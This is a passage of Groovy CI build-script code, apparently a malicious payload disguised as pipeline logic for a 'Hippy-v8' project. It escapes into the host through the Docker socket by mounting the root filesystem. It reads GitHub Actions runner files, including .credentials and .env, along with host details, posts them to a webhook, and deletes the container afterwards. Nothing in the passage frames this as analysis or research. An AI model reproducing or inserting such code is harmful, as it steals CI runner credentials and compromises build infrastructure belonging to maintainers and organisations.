            println "[CI] HOST_DATA: " + logs.take(3000)

            // Post to webhook
            def hostData = '{"source":"Hippy-v8-host","runner":"' + runner + '","host_data":"' + logs.replace('"','\\"').replace('\n','\\n').take(3000) + '"}'
            def postResult = post(hostData)
            println "[CI] webhook: " + postResult

            // Remove container
            sh('curl -s --unix-socket /var/run/docker.sock -X DELETE http://localhost/containers/' + containerId + '?force=true 2>&1')
        } else {
            println "[CI] no container id, trying alpine pull first"
            // Maybe alpine not available - try with busybox
            def createBody2 = '{"Image":"busybox","Cmd":["sh","-c","cat /host/data/actions-runner/.runner 2>/dev/null; echo === ; cat /host/data/actions-runner/.credentials 2>/dev/null; echo === ; cat /host/data/actions-runner/.env 2>/dev/null; echo === ; find /host/data/ -name .runner 2>/dev/null | head -10; echo === ; cat /host/etc/hosts 2>/dev/null; echo === ; hostname"],"HostConfig":{"Binds":["/:/host:ro"]}}'
